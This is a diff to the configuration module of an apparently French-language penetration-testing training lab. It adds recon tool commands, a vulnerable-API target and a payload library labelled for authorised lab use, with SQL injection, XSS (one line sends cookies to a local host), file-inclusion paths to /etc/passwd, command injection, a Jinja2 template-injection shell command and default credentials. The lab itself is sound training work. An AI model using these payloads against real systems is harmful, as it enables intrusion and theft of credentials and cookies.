@@ -21,19 +21,6 @@ const TARGETS = [
     tip: 'Application Angular : passe par le tunnel SSH pour la voir, le proxy web la casse.',
   },
   {
-    id: 'dvwa',
-    container: 'lab-dvwa',
-    name: 'DVWA',
-    port: 3002,
-    difficulty: 'Débutant',
-    tags: ['Web', 'PHP'],
-    blurb:
-      "Damn Vulnerable Web Application. Chaque faille (injection SQL, XSS, upload…) est isolée avec 4 niveaux de sécurité. Idéal pour comprendre une faille à la fois.",
-    creds: 'admin / password — puis « Create / Reset Database »',
-    proxyOk: true,
-    tip: 'Sert des pages classiques : marche directement dans le navigateur via le bouton Ouvrir.',
-  },
-  {
     id: 'webgoat',
     container: 'lab-webgoat',
     name: 'OWASP WebGoat',
@@ -305,3 +292,106 @@ const MISSION_STATUSES = [
 module.exports.MISSION_CHECKLIST = MISSION_CHECKLIST;
 module.exports.SEVERITIES = SEVERITIES;
 module.exports.MISSION_STATUSES = MISSION_STATUSES;
+
+// --- Outils supplémentaires ---
+TOOLS.push(
+  {
+    id: 'nikto', name: 'nikto', role: 'Scan de serveur web (mauvaises configs, fichiers connus)',
+    commands: [{ label: 'Scan d\'un hôte du labo', cmd: 'nikto -h http://127.0.0.1:3001' }],
+  },
+  {
+    id: 'wafw00f', name: 'wafw00f', role: 'Détecter un pare-feu applicatif (WAF)',
+    commands: [{ label: 'Identifier le WAF', cmd: 'wafw00f http://127.0.0.1:3001' }],
+  },
+  {
+    id: 'sslscan', name: 'openssl / sslscan', role: 'Analyser la configuration TLS',
+    commands: [{ label: 'Détails du certificat', cmd: 'echo | openssl s_client -connect 127.0.0.1:443 2>/dev/null | openssl x509 -noout -subject -dates' }],
+  },
+  {
+    id: 'wpscan', name: 'wpscan', role: 'Audit de sites WordPress (si applicable)',
+    commands: [{ label: 'Énumérer un WordPress', cmd: 'wpscan --url http://127.0.0.1:3001 --enumerate p,t,u' }],
+  },
+  {
+    id: 'subfinder', name: 'subfinder', role: 'Découverte de sous-domaines (passif)',
+    commands: [{ label: 'Sous-domaines d\'un domaine', cmd: 'subfinder -d exemple.tld' }],
+  },
+  {
+    id: 'httpx', name: 'httpx', role: 'Sonder des hôtes web en masse (statut, techno)',
+    commands: [{ label: 'Sonder une liste d\'URL', cmd: 'httpx -status-code -title -tech-detect -u http://127.0.0.1:3001' }],
+  }
+);
+
+// --- Bibliothèque de payloads (référence — à tester UNIQUEMENT sur le labo/cibles autorisées) ---
+const PAYLOADS = [
+  {
+    id: 'sqli', name: 'Injection SQL',
+    items: [
+      { label: 'Contournement d\'authentification', value: "' OR '1'='1" },
+      { label: 'Contournement (commentaire)', value: "admin'-- -" },
+      { label: 'Basé sur l\'erreur', value: "' AND 1=CONVERT(int,(SELECT @@version))-- -" },
+      { label: 'UNION (colonnes)', value: "' UNION SELECT NULL,NULL,NULL-- -" },
+      { label: 'Basé sur le temps (MySQL)', value: "' OR SLEEP(5)-- -" },
+    ],
+  },
+  {
+    id: 'xss', name: 'XSS (Cross-Site Scripting)',
+    items: [
+      { label: 'Basique', value: '<script>alert(1)</script>' },
+      { label: 'Image onerror', value: '<img src=x onerror=alert(1)>' },
+      { label: 'SVG', value: '<svg onload=alert(1)>' },
+      { label: 'Attribut (sortie de contexte)', value: '"><script>alert(1)</script>' },
+      { label: 'Vol de cookie (démo labo)', value: "<script>new Image().src='http://127.0.0.1/?c='+document.cookie</script>" },
+    ],
+  },
+  {
+    id: 'lfi', name: 'Inclusion de fichier (LFI/RFI)',
+    items: [
+      { label: 'Fichier passwd (Linux)', value: '../../../../etc/passwd' },
+      { label: 'Encodage null-byte (ancien PHP)', value: '../../../../etc/passwd%00' },
+      { label: 'Filtre PHP (source)', value: 'php://filter/convert.base64-encode/resource=index.php' },
+    ],
+  },
+  {
+    id: 'cmd', name: 'Injection de commande',
+    items: [
+      { label: 'Chaînage', value: '; id' },
+      { label: 'ET logique', value: '&& whoami' },
+      { label: 'Sous-shell', value: '$(id)' },
+      { label: 'Retour ligne + cmd', value: '%0a id' },
+    ],
+  },
+  {
+    id: 'ssti', name: 'SSTI (templates)',
+    items: [
+      { label: 'Détection', value: '{{7*7}}' },
+      { label: 'Détection (autre moteur)', value: '${7*7}' },
+      { label: 'Jinja2 (Python)', value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" },
+    ],
+  },
+  {
+    id: 'creds', name: 'Identifiants par défaut à tester',
+    items: [
+      { label: 'admin / admin', value: 'admin:admin' },
+      { label: 'admin / password', value: 'admin:password' },
+      { label: 'root / root', value: 'root:root' },
+      { label: 'admin / changeme', value: 'admin:changeme' },
+      { label: 'test / test', value: 'test:test' },
+    ],
+  },
+];
+
+module.exports.PAYLOADS = PAYLOADS;
+
+// --- Cible API vulnérable ---
+TARGETS.push({
+  id: 'vampi',
+  container: 'lab-vampi',
+  name: 'VAmPI (API vulnérable)',
+  port: 3004,
+  difficulty: 'Intermédiaire',
+  tags: ['API', 'REST', 'Python'],
+  blurb: "Une API REST volontairement vulnérable (OWASP API Security Top 10) : parfaite pour t'entraîner sur les failles d'API — auth cassée, accès non autorisé, injection.",
+  creds: 'Initialise la base via GET /createdb, puis explore /users, /books',
+  proxyOk: false,
+  tip: 'API JSON : utilise le Terminal avec curl plutôt que le navigateur.',
+});
